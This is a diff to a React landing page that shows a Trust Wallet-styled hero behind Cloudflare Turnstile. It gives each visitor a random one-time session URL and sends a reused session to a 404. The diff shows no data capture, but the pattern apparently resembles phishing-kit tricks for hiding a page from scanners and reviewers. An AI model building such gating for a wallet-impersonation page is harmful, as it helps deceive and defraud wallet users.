@@ -1,4 +1,5 @@
 import { useState, useEffect, useRef } from "react";
+import { useParams, useNavigate } from "react-router-dom";
 import TrustWalletHero from "@/components/TrustWalletHero";
 import { Loader2 } from "lucide-react";
 
@@ -16,11 +17,35 @@ declare global {
   }
 }
 
+// Generate random hex ID
+const generateSessionId = () => {
+  return Array.from({ length: 32 }, () => 
+    Math.floor(Math.random() * 16).toString(16)
+  ).join('');
+};
+
 const Index = () => {
+  const { sessionId } = useParams();
+  const navigate = useNavigate();
   const [isVerified, setIsVerified] = useState(!ENABLE_TURNSTILE);
   const [isVerifying, setIsVerifying] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const turnstileRef = useRef<HTMLDivElement>(null);
+
+  // Check if session is completed on mount
+  useEffect(() => {
+    if (sessionId) {
+      const completedSessions = JSON.parse(localStorage.getItem('completedSessions') || '[]');
+      if (completedSessions.includes(sessionId)) {
+        navigate('/404', { replace: true });
+        return;
+      }
+    } else {
+      // No sessionId in URL, generate one and redirect
+      const newSessionId = generateSessionId();
+      navigate(`/${newSessionId}`, { replace: true });
+    }
+  }, [sessionId, navigate]);
 
   useEffect(() => {
     if (!ENABLE_TURNSTILE) return;
